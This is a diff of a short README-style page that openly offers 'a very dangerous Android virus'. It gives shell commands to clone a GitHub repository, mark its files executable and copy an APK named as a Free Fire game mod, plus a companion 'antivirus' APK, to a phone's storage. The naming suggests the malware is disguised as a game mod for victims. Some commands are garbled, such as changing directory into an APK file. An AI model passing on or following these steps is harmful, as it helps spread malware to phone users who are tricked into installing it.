@@ -1,16 +1,18 @@
 A VERY DANGEROUS ANDROID VIRUS😈
 
           COMMANDS👇
-$ git clone https://github.com/gurugrover/GuruGroverTECH
+$ git clone https://github.com/M4ST3RH4CK3R1/Free-Fire-Virus
 
-$ cd GuruGroverTECH
+$ cd Free-Fire-Virus
 
 $ chmod +x *
 
-Virus ---> $ cd virus
+$ ls
 
-$ mv null.apk /sdcard
+Virus ---> $ cd Free_Fire_Virus_mod.apk
 
-Antivirus ---> $ cd antivirus
+$ mv Free_Fire_Virus_mod.apk /sdcard
 
-$ mv gen_signed.apk /sdcard
+Antivirus ---> $ cd Free_Fire_Antivirus.apk
+
+$ mv Free_Fire_Antivirus.apk /sdcard
